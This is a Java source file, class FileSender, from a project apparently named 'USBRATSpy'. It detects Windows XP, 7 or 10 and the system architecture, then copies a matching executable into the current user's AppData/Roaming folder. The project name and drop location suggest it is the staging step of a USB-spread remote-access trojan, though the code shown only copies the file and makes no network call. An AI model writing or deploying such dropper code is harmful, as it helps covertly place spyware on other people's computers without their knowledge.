package com.f0s30n3;

import java.io.*;
import java.nio.channels.FileChannel;

public class FileSender {
    public String os = System.getProperty("os.name").toUpperCase();
    public String arch = System.getProperty("sun.arch.data.model");
    public String username = System.getProperty("user.name");
    public String path = "C:/Users/" + username + "/AppData/Roaming/";
    public String pathFrom = "D:/IntelliJ IDEA 2017.1.1/IdeaProjects/USBRATSpy/src/com/f0s30n3/files/";


    public void checkOS() throws IOException {
        if (os.equalsIgnoreCase("WINDOWS 10") && arch.equalsIgnoreCase("64")) {
            System.out.println("Windows 10 x64 detected.");
            copyFile();
        } else if (os.equalsIgnoreCase("WINDOWS 10") && arch.equalsIgnoreCase("32")) {
            System.out.println("Windows 10 x32 detected.");
            copyFile();
        } else if (os.equalsIgnoreCase("WINDOWS 7") && arch.equalsIgnoreCase("64")) {
            System.out.println("Windows 7 x64 detected.");
            copyFile();
        } else if (os.equalsIgnoreCase("WINDOWS 7") && arch.equalsIgnoreCase("32")) {
            System.out.println("Windows 7 x32 detected.");
            copyFile();
        } else if (os.equalsIgnoreCase("WINDOWS XP") && arch.equalsIgnoreCase("64")) {
            System.out.println("Windows XP x64 detected.");
            copyFile();
        } else if (os.equalsIgnoreCase("WINDOWS XP") && arch.equalsIgnoreCase("32")) {
            System.out.println("Windows XP x32 detected.");
            copyFile();
        }
    }

    private void copyFile() throws IOException {
        File source = new File( pathFrom + os + "." + arch + ".exe");
        File destination = new File(path + os + "." + arch + ".exe");
        FileChannel sourceChannel = new FileInputStream(source).getChannel();
        FileChannel destinationChannel = new FileOutputStream(destination).getChannel();
        destinationChannel.transferFrom(sourceChannel,0,sourceChannel.size());
        sourceChannel.close();
        destinationChannel.close();
        System.out.print("Transfer completed successfully.");
    }
}

